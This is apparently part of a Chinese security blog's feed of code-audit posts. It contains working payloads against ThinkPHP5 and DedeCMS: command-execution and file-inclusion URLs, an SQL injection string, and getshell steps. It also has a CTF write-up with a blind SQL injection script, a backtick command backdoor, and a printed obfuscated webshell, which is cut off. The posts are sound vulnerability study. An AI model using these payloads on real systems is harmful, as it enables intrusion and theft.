href="http://127.0.0.1/cms/dedecms/uploads/dede/tpl.php?action=savetagfile&amp;token=5410054b6a79c4ffaa65fa83b5929478&amp;filename=od0d.lib.php&amp;content=%3C?php%20phpinfo();?%3E" target="_blank" rel="noopener">http://127.0.0.1/cms/dedecms/uploads/dede/tpl.php?action=savetagfile&amp;token=5410054b6a79c4ffaa65fa83b5929478&amp;filename=od0d.lib.php&amp;content=%3C?php%20phpinfo();?%3E</a></p><p><img src="./9.png" srcset="/img/loading.gif" alt=""></p><h1 id="payload-4"><a href="#payload-4" class="headerlink" title="payload[4]"></a>payload[4]</h1><p>payload:<a href="http://127.0.0.1/cms/dedecms/uploads/plus/ad_js.php?nocache=1&amp;aid=1" target="_blank" rel="noopener">http://127.0.0.1/cms/dedecms/uploads/plus/ad_js.php?nocache=1&amp;aid=1</a></p><p>该payload下会将数据库中获取的内容写入js中,并<code>include</code><br>提取数据库数据是通过<strong>/dede/ad_add.php</strong>广告添加之后获取</p><p><img src="./10.png" srcset="/img/loading.gif" alt=""></p><p>首先添加广告内容<strong>/dede/ad_add.php</strong>,可以使用文件监控查看内容变化.在所有可以输入的地方添加<code>--&gt;&lt;?php phpinfo(); ?&gt;</code><br><img src="./11.png" srcset="/img/loading.gif" alt=""></p><p><a href="http://127.0.0.1/cms/dedecms/uploads/plus/ad_js.php?nocache=1&amp;aid=1" target="_blank" rel="noopener">http://127.0.0.1/cms/dedecms/uploads/plus/ad_js.php?nocache=1&amp;aid=1</a><br><img src="./12.png" srcset="/img/loading.gif" alt=""></p><h1 id="payload-5"><a href="#payload-5" class="headerlink" title="payload[5]"></a>payload[5]</h1><p><a href="https://zhzhdoai.github.io/2019/03/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-DedeCMS%E5%90%8E%E5%8F%B0getshell/">DedeCMS后台getshell(白名单)</a></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mochazz.github.io" target="_blank" rel="noopener">https://mochazz.github.io</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Thinkphp5 远程代码执行(一)</title>
    <link href="/2019/07/27/Thinkphp5-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <url>/2019/07/27/Thinkphp5-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>跟着payload又撸了一遍框架，漏洞原因可以参照<a href="https://mochazz.github.io/2019/04/08/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9/#group-3" target="_blank" rel="noopener">七月火师傅</a>，我用的是5.0.18版本会有一些代码差异。如下文章整的比较详细，包括路由解析、控制器调用、反射类调用…。也是学习框架.</p><h1 id="url解析流程"><a href="#url解析流程" class="headerlink" title="url解析流程"></a>url解析流程</h1><blockquote><p>加载路由配置文件、path规则检验-&gt;url解析(拆分模块、控制器、操作方法)-&gt;判断调用分类-&gt;case: module-&gt;获取控制器名、操作名-&gt;反射类实现操作</p></blockquote><h1 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h1><p>框架在调用s路由模式下的控制器和操作方法未做严格的限制，导致可以任意调用框架内部任何类.</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>tp版本: 5.0.18</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="url解析"><a href="#url解析" class="headerlink" title="url解析"></a>url解析</h2><p>跟进App.php下第115行$disaptch参数赋值情况</p><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($dispatch)) &#123;                $dispatch = <span class="hljs-keyword">self</span>::routeCheck($request, $config);            &#125;</code></pre><p>跟进routeCheck方法，返回值取决于Route:parseUrl，继续跟进.</p><p><code>$url=&quot;index/\think\app/invokefunction&quot;</code><br>parseUrlPath函数以’/‘拆分形成[模块/控制器/操作器].<br><img src="./1.png" srcset="/img/loading.gif" alt=""></p><p>函数返回值<code>$result</code>赋值到$dispatch中</p><p><code>$dispatch = self::routeCheck($request, $config);</code><br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h1 id="控制器、方法获取"><a href="#控制器、方法获取" class="headerlink" title="控制器、方法获取"></a>控制器、方法获取</h1><p>控制器和方法名定义是在App.php第139行,通过exec方法获取，其中的参数$dispatch获取在<strong>url解析</strong>里已经说明。<br>跟进exec方法发现<strong>模块/控制器/操作</strong>是由<strong>switch语句</strong>选择，直接跟进<code>case &#39;module&#39;</code></p><p>第553~558行直接在<strong>result数组</strong>中取出值，并未做判断</p><pre><code class="hljs php"><span class="hljs-comment">// 获取控制器名</span>$controller = strip_tags($result[<span class="hljs-number">1</span>] ?: $config[<span class="hljs-string">'default_controller'</span>]);$controller = $convert ? strtolower($controller) : $controller;<span class="hljs-comment">// 获取操作名</span>$actionName = strip_tags($result[<span class="hljs-number">2</span>] ?: $config[<span class="hljs-string">'default_action'</span>]);$actionName = $convert ? strtolower($actionName) : $actionName;</code></pre><h1 id="控制器、方法调用"><a href="#控制器、方法调用" class="headerlink" title="控制器、方法调用"></a>控制器、方法调用</h1><p><strong>tp框架调用反射类调用控制器和方法</strong></p><p>执行语句在App.php第602行<strong>invokeMethd方法</strong></p><p><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p><strong>App.php第339行</strong>bindParams对执行的方法参数绑定,跟进方法，<code>$vars</code>变量由param()方法获取。</p><p><code>$args</code>数组值是由<code>getParamValue</code>方法从$vars数组中取出.<strong>其中$name值由反射方法所需参数名决定=&gt;getName()</strong></p><p><img src="./4.png" srcset="/img/loading.gif" alt=""></p><p>最后回到<strong>invokeMethod()</strong>方法中，返回值<code>$reflect</code>调用<code>invokeArgs()</code>实现方法调用.<br>即<strong>/think/App.php</strong> 中<code>invokeFunction</code>方法的实现.</p><pre><code class="hljs php"><span class="hljs-keyword">return</span> $reflect-&gt;invokeArgs(<span class="hljs-keyword">isset</span>($class) ? $class : <span class="hljs-keyword">null</span>, $args);</code></pre><p><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>综上payload:<a href="http://127.0.0.1:8897/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1" target="_blank" rel="noopener">http://127.0.0.1:8897/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</a></p><p>可以等效如下<br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>根据以上分析参数名是由反射类getName()获取，所以知道找到触发漏洞的类，在查看传入的参数名即可构造payload。<br>如:</p><pre><code class="hljs dockerfile">?s=index/\think\Lang/load&amp;file=<span class="hljs-keyword">shell</span>.<span class="bash">jpg    <span class="hljs-comment"># 包含任意文件</span></span></code></pre><p><img src="./7.png" srcset="/img/loading.gif" alt=""></p><p>其他一些payload，原理都相似</p><p><strong>5.1.x:</strong></p><pre><code class="hljs url">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</code></pre><p><strong>5.0.x ：</strong></p><pre><code class="hljs url">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # 获取配置信息?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    # 包含任意文件?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     # 包含任意.php文件?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Thinkphp5 文件包含</title>
    <link href="/2019/07/26/Thinkphp5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2019/07/26/Thinkphp5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在复现tp漏洞，sql注入略显鸡肋，但更主要是学习框架漏洞挖掘的思路和方法。跟一跟框架方法实现流程，也算是一种漏洞学习吧。</p><p>参考文章:<a href="https://mochazz.github.io/2019/04/04/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB7/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90" target="_blank" rel="noopener">ThinkPHP5漏洞分析之文件包含(七)</a><br>七月火师傅…介绍比较完全，该篇漏洞算是简单的了，跟一跟变量就可以知道原因，但还是想学习下框架模板解析流程。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><strong>tp版本</strong>：5.0.18</p><p><strong>文件内容</strong></p><ol><li>视图目录下写入index.html模板文件</li><li>index控制器写入当前漏洞测试语句<br><img src="./1.png" srcset="/img/loading.gif" alt=""></li></ol><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>模拟上传功能，public目录下创建shell.jpg</p><p><strong>payload</strong>:<a href="http://127.0.0.1:8899/?cacheFile=shell.jpg" target="_blank" rel="noopener">http://127.0.0.1:8899/?cacheFile=shell.jpg</a></p><p><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>extract变量覆盖、inlucde文件包含不当且可控.</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p><strong><em>分析思路很明确只要跟踪传入的变量即可.但我还是走一遍流程，仔细阅读了tp模板解析时候的操作。</em></strong></p><h2 id="assgin方法执行流程"><a href="#assgin方法执行流程" class="headerlink" title="assgin方法执行流程"></a>assgin方法执行流程</h2><p><strong>assign操作为接收requests-&gt;get()对象，并提取其中的变量，为后续渲染模板提供参数值。</strong></p><p><strong>assign方法</strong>将接收到的参数值存入<code>$this-&gt;data</code>值中，并返回$this对象</p><p>data= <code>$name =&gt; {cacheFIle =&gt; &quot;shell.jpg&quot;}[1]</code></p><p><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p>至此<code>$this</code>对象囊括了如下变量信息</p><p><img src="./4.png" srcset="/img/loading.gif" alt=""></p><h2 id="fetch执行流程"><a href="#fetch执行流程" class="headerlink" title="fetch执行流程"></a>fetch执行流程</h2><p><strong>/think/view.php fetch()方法</strong>用于解析和获取模板内容。重点关注模板变量<code>$var</code></p><p><code>$var</code>值为<code>$this-&gt;data</code>值传入[<strong>assign方法</strong>的返回值]。跟进第163行中的$method，调用<strong>/library/think/Template.php fetch方法</strong>。</p><p><strong>代码2-25行</strong>执行目的是判断是否存在缓存文件，不存在则编译创建缓存文件。</p><p><img src="./5.png" srcset="/img/loading.gif" alt=""></p><p><strong>第29行read()</strong>读取缓存文件.查看具体代码</p><p>extract将第二个参数值设置为<strong>EXTR_OVERWRITE</strong>导致变量覆盖</p><p>将<code>$vars={cacheFIle=&gt;&#39;shell.jpg&#39;}</code>注册为变量 <strong>=&gt;</strong>  <code>$cacheFile=&#39;shell.jpg&#39;;</code> </p><p><code>include</code>之解析<strong>shell.jpg</strong>中的php代码<br><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p><code>include $cacheFile;</code>  <strong>=&gt;</strong>  <code>include $this-&gt;cacheFile;</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Thinkphp5 SQL注入(parseWhereItem)</title>
    <link href="/2019/07/25/Thinkphp5-SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2019/07/25/Thinkphp5-SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="thinkphp执行sql语句流程"><a href="#thinkphp执行sql语句流程" class="headerlink" title="thinkphp执行sql语句流程"></a>thinkphp执行sql语句流程</h1><blockquote><p><strong>where方法解析参数返回$this对象 -&gt; /Query.php/select()根据where方法产生的option结果,分析查询表达式 -&gt; /Builder.php/select方法根据option数组存在的键值调用相对应的语句解析，生成sql语句 -&gt; 调用PDO查询prepare($SQL)编译sql语句 -&gt; bindValue($param, $value)将value绑定到param上 -&gt; execute()执行。</strong></p></blockquote><p>该漏洞是利用prepare编译时报错进行注入,当然前期的无过滤和拼接是诱导注入的主因</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p><strong>版本</strong>：Thinkphp：　5.0.10</p><p><strong>漏洞影响版本</strong>: ThinkPHP5全版本</p><p><strong>启动</strong>：public目录下<code>php5 -S 127.0.0.1:8899 router.php</code></p><p><strong>配置</strong>：数据库连接配置,app_debug、app_trace开启</p><p><strong>数据库</strong>：mysql</p><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> tpdemo;<span class="hljs-keyword">use</span> tpdemo;<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">users</span>(<span class="hljs-keyword">id</span> <span class="hljs-built_in">int</span> primary <span class="hljs-keyword">key</span> auto_increment,username <span class="hljs-built_in">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">not</span> <span class="hljs-literal">null</span>);<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span>(<span class="hljs-keyword">id</span>,username) <span class="hljs-keyword">values</span>(<span class="hljs-number">1</span>,<span class="hljs-string">'od0d'</span>);</code></pre><p><strong>文件内容</strong>：app/index/controller/index</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>&#123;        $username = request()-&gt;get(<span class="hljs-string">'username'</span>);        $result = db(<span class="hljs-string">'users'</span>)-&gt;where(<span class="hljs-string">'username'</span>,<span class="hljs-string">'exp'</span>,$username)-&gt;select();        <span class="hljs-keyword">return</span> <span class="hljs-string">'select success'</span>;    &#125;&#125;</code></pre><h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><p>payload: <a href="http://127.0.0.1:8899/?username=)%20union%20select%20updatexml(1%2cconcat(0x7e,database()%2c0x7e)%2c1)%23%20" target="_blank" rel="noopener">http://127.0.0.1:8899/?username=)%20union%20select%20updatexml(1%2cconcat(0x7e,database()%2c0x7e)%2c1)%23%20</a> [url编码]<br><img src="./1.png" srcset="/img/loading.gif" alt=""></p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><ol><li>thinkphp框架没有对传入参数进行sql过滤</li><li>parseItem直接对注入参数值拼接</li></ol><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="参数传入与过滤情况"><a href="#参数传入与过滤情况" class="headerlink" title="参数传入与过滤情况"></a>参数传入与过滤情况</h2><p>thinkphp调用request类get方法传入参数。若没有设置过滤函数默认为空，之后也只是简单调用框架的过滤方法<code>filterExp</code></p><h2 id="where方法解析参数"><a href="#where方法解析参数" class="headerlink" title="where方法解析参数"></a>where方法解析参数</h2><p><strong>where方法</strong>返回值为<code>$this</code>,需要关注是<code>options</code>,该值传入<strong>Query类</strong>中的<code>options</code>数组。</p><p><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h2 id="sql查询语句构造"><a href="#sql查询语句构造" class="headerlink" title="sql查询语句构造"></a>sql查询语句构造</h2><p>跟进select方法sql查询组成，是由多个sql解析方法组成</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">select</span><span class="hljs-params">($options = [])</span></span><span class="hljs-function"></span>&#123;    $sql = str_replace(        [<span class="hljs-string">'%TABLE%'</span>, <span class="hljs-string">'%DISTINCT%'</span>, <span class="hljs-string">'%FIELD%'</span>, <span class="hljs-string">'%JOIN%'</span>, <span class="hljs-string">'%WHERE%'</span>, <span class="hljs-string">'%GROUP%'</span>, <span class="hljs-string">'%HAVING%'</span>, <span class="hljs-string">'%ORDER%'</span>, <span class="hljs-string">'%LIMIT%'</span>, <span class="hljs-string">'%UNION%'</span>, <span class="hljs-string">'%LOCK%'</span>, <span class="hljs-string">'%COMMENT%'</span>, <span class="hljs-string">'%FORCE%'</span>],        [            <span class="hljs-keyword">$this</span>-&gt;parseTable($options[<span class="hljs-string">'table'</span>], $options),            <span class="hljs-keyword">$this</span>-&gt;parseDistinct($options[<span class="hljs-string">'distinct'</span>]),            <span class="hljs-keyword">$this</span>-&gt;parseField($options[<span class="hljs-string">'field'</span>], $options),            <span class="hljs-keyword">$this</span>-&gt;parseJoin($options[<span class="hljs-string">'join'</span>], $options),            <span class="hljs-keyword">$this</span>-&gt;parseWhere($options[<span class="hljs-string">'where'</span>], $options),            <span class="hljs-keyword">$this</span>-&gt;parseGroup($options[<span class="hljs-string">'group'</span>]),            <span class="hljs-keyword">$this</span>-&gt;parseHaving($options[<span class="hljs-string">'having'</span>]),            <span class="hljs-keyword">$this</span>-&gt;parseOrder($options[<span class="hljs-string">'order'</span>], $options),            <span class="hljs-keyword">$this</span>-&gt;parseLimit($options[<span class="hljs-string">'limit'</span>]),            <span class="hljs-keyword">$this</span>-&gt;parseUnion($options[<span class="hljs-string">'union'</span>]),            <span class="hljs-keyword">$this</span>-&gt;parseLock($options[<span class="hljs-string">'lock'</span>]),            <span class="hljs-keyword">$this</span>-&gt;parseComment($options[<span class="hljs-string">'comment'</span>]),            <span class="hljs-keyword">$this</span>-&gt;parseForce($options[<span class="hljs-string">'force'</span>]),        ], <span class="hljs-keyword">$this</span>-&gt;selectSql);    <span class="hljs-keyword">return</span> $sql;&#125;</code></pre><p>跟进<code>buildWhere</code>方法分析where语句拼接情况。<br>函数逻辑进入最后一个else语句</p><pre><code class="hljs php"><span class="hljs-keyword">else</span> &#123;                    <span class="hljs-comment">// 对字段使用表达式查询</span>                    $field = is_string($field) ? $field : <span class="hljs-string">''</span>;                    $str[] = <span class="hljs-string">' '</span> . $key . <span class="hljs-string">' '</span> . <span class="hljs-keyword">$this</span>-&gt;parseWhereItem($field, $value, $key, $options, $binds);                &#125;</code></pre><p><strong>parseWhereItem方法</strong>中，<code>$exp=&#39;EXP&#39;</code>,该逻辑直接对<code>$key、$value</code>值进行拼接。造成注入</p><p>$key＝“`username`”</p><p>$value=”) union select updatexml(1,concat(0x7e,database(),0x7e),1)# “</p><pre><code class="hljs php"><span class="hljs-keyword">elseif</span> (<span class="hljs-string">'EXP'</span> == $exp) &#123;            <span class="hljs-comment">// 表达式查询</span>            $whereStr .= <span class="hljs-string">'( '</span> . $key . <span class="hljs-string">' '</span> . $value . <span class="hljs-string">' )'</span>;</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mochazz.github.io/2019/03/23/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A53/#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%A6%81" target="_blank" rel="noopener">ThinkPHP5漏洞分析之SQL注入(三)</a></p><p><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html" target="_blank" rel="noopener">ThinkPHP5 SQL注入漏洞 &amp;&amp; PDO真/伪预处理分析</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019ISCC线下赛web题解</title>
    <link href="/2019/07/24/2019ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/"/>
    <url>/2019/07/24/2019ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次参加AWD模式没啥经验，还好手速快没被日穿，分享下web题解。</p><h1 id="sprintf字符格式化漏洞解析"><a href="#sprintf字符格式化漏洞解析" class="headerlink" title="sprintf字符格式化漏洞解析"></a>sprintf字符格式化漏洞解析</h1><h2 id="sprintf函数"><a href="#sprintf函数" class="headerlink" title="sprintf函数"></a>sprintf函数</h2><pre><code class="hljs mel">sprintf （ <span class="hljs-keyword">string</span> $format [， mixed $... ]）： <span class="hljs-keyword">string</span>返回根据格式化字符串生成的字符串<span class="hljs-keyword">format</span></code></pre><p><strong>format规则</strong>：<code>%[flags][width][.precision]specifier</code><br><strong>flag</strong>: <code>-、+、空格、0、&#39;(char)[如&#39;^]</code><br><strong>width</strong>: 一个整数,表示此转换应产生的字符数(最小值)</p><h3 id="format特性导致单引号逃逸或丢掉丢掉"><a href="#format特性导致单引号逃逸或丢掉丢掉" class="headerlink" title="format特性导致单引号逃逸或丢掉丢掉"></a>format特性导致单引号逃逸或丢掉丢掉</h3><ol><li><code>&#39;(char)</code>将导致单引号被吞掉<pre><code class="hljs php">php &gt; <span class="hljs-keyword">echo</span> sprintf(<span class="hljs-string">"%'^10s"</span>,<span class="hljs-string">'od0d'</span>);^^^^^^od0d</code></pre></li><li>传入字符<code>%1$\&#39;</code>,sprintf无法识别会将<code>%1$\</code>字符串扔掉,逃逸出<code>&#39;</code></li></ol><pre><code class="hljs php">php &gt; <span class="hljs-keyword">echo</span> sprintf(<span class="hljs-string">"%1$\'"</span>,<span class="hljs-string">'od0d'</span>);<span class="hljs-string">'</span></code></pre><h1 id="高地WEB解题"><a href="#高地WEB解题" class="headerlink" title="高地WEB解题"></a>高地WEB解题</h1><p>题目考点为sprintf格式化字符漏洞</p><p>题目可简化为如下源码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$mysqli = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">"localhost"</span>, <span class="hljs-string">"root"</span>, <span class="hljs-string">"root"</span>, <span class="hljs-string">"security"</span>);   $Profile = sprintf(<span class="hljs-string">"password = '%s'"</span>, mysqli_real_escape_string($mysqli, $_GET[<span class="hljs-string">'profile'</span>]));   $sql = sprintf(<span class="hljs-string">"update users set $Profile where username='%s'"</span>, mysqli_real_escape_string($mysqli, <span class="hljs-string">'Dumb'</span>));   var_dump($sql);   $result = $mysqli-&gt;query($sql);   <span class="hljs-keyword">if</span>($result===<span class="hljs-keyword">True</span>)&#123;      <span class="hljs-keyword">echo</span> <span class="hljs-string">'success'</span>;   &#125;<span class="hljs-keyword">else</span>&#123;      <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h1 style='color:red;'&gt;$mysqli-&gt;error&lt;/h1&gt;"</span>;   &#125;</code></pre><p>两次使用sprintf逃逸单引号</p><p>传入<strong>profile</strong>=<code>%1$&#39;</code> =&gt; <code>sprintf</code>作用后返回<strong>$Profile</strong>=<code>&quot;%1$\&#39;&quot;</code>;</p><p>进入<strong>$sql</strong>语句:　<code>sprintf</code>将<code>%1$\</code>吃掉逃逸出一个单引号，造成注入 </p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> time<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sqlinject</span><span class="hljs-params">()</span>:</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">128</span>):<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):sql=<span class="hljs-string">f"http://127.0.0.1/sql.php?profile=%1$\' where username=0x44756d62 and if(ascii(substr((database()),<span class="hljs-subst">&#123;j&#125;</span>,1))=<span class="hljs-subst">&#123;i&#125;</span>,sleep(1),0)--+"</span>ss=time.time()res=requests.get(sql)<span class="hljs-keyword">if</span> time.time()-ss&gt;=<span class="hljs-number">0.5</span>:<span class="hljs-comment">#print(sql)</span>print(chr(i))<span class="hljs-keyword">if</span> <span class="hljs-string">'__main__'</span>==__name__:sqlinject()</code></pre><h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><h2 id="获取靶机shell思路"><a href="#获取靶机shell思路" class="headerlink" title="获取靶机shell思路"></a>获取靶机shell思路</h2><p>靶机使用的cms是<strong>emblog 5.3.1</strong>。翻了翻前台历史漏洞没有getshell的点。</p><p>后台有个登录界面,管理员用户名提示在前台寄语处为：<strong>isccadmin</strong><br>后台通过爆破得到密码：<strong>passw0rd</strong></p><p>登录到管理员界面,发现有大量文件上传的点，但是都没有写入权限，后来管理员开了写入权限才通过头像上传成功<strong>getshell</strong>。</p><h2 id="防守思路"><a href="#防守思路" class="headerlink" title="防守思路"></a>防守思路</h2><p>备份源码、上waf、修改服务器敏感目录权限、查看日志、修改弱密码</p><h2 id="靶机getshell漏洞点"><a href="#靶机getshell漏洞点" class="headerlink" title="靶机getshell漏洞点"></a>靶机getshell漏洞点</h2><h3 id="xmlrpc-php命令执行"><a href="#xmlrpc-php命令执行" class="headerlink" title="xmlrpc.php命令执行"></a>xmlrpc.php命令执行</h3><pre><code class="hljs php"><span class="hljs-comment">// 向客户端发送api支持信息</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'rsd'</span>])) &#123;$rsd=$_GET[<span class="hljs-string">'rsd'</span>];<span class="hljs-keyword">echo</span> `$rsd`;header(<span class="hljs-string">'Content-Type: text/xml; charset=utf-8'</span>, <span class="hljs-keyword">true</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><span class="hljs-string">&lt;rsd version="1.0" xmlns="http://archipelago.phrasewise.com/rsd"&gt;</span><span class="hljs-string">&lt;service&gt;</span><span class="hljs-string">&lt;engineName&gt;emlog&lt;/engineName&gt;</span><span class="hljs-string">&lt;engineLink&gt;http://emlog.net/&lt;/engineLink&gt;</span><span class="hljs-string">&lt;homePageLink&gt;'</span> . $options_cache[<span class="hljs-string">'blogurl'</span>] . <span class="hljs-string">'&lt;/homePageLink&gt;</span><span class="hljs-string">&lt;apis&gt;</span><span class="hljs-string">&lt;api name="MetaWeblog" blogID="1" preferred="true" apiLink="'</span> . $options_cache[<span class="hljs-string">'blogurl'</span>] . <span class="hljs-string">'xmlrpc.php" /&gt;</span><span class="hljs-string">&lt;api name="Blogger" blogID="1" preferred="false" apiLink="'</span> . $options_cache[<span class="hljs-string">'blogurl'</span>] . <span class="hljs-string">'xmlrpc.php" /&gt;</span><span class="hljs-string">&lt;/apis&gt;</span><span class="hljs-string">&lt;/service&gt;</span><span class="hljs-string">&lt;/rsd&gt;</span><span class="hljs-string"> '</span>;<span class="hljs-keyword">exit</span>;&#125;</code></pre><p>漏洞点</p><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> `<span class="hljs-variable">$rsd</span>`</code></pre><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><p><strong>/include/model/log_model.php</strong>存在可执行变量，源码如下</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$o=<span class="hljs-string">'n();$r=@bas&#125;&gt;&#125;&gt;e64_encode(@x(&#125;&gt;@gzc&#125;&gt;o&#125;&gt;mpress($o),$&#125;&gt;k));p&#125;&gt;rint("&#125;&gt;$p$kh&#125;&gt;$r$kf");&#125;'</span>;$g=<span class="hljs-string">'&gt;EgwZ7H&#125;&gt;iEecl&#125;&gt;S";function &#125;&gt;x($t,$&#125;&gt;k)&#123;$&#125;&gt;&#125;&gt;c=s&#125;&gt;trlen(&#125;&gt;$k)&#125;&gt;;$l=strlen($t);$o="'</span>;$l=<span 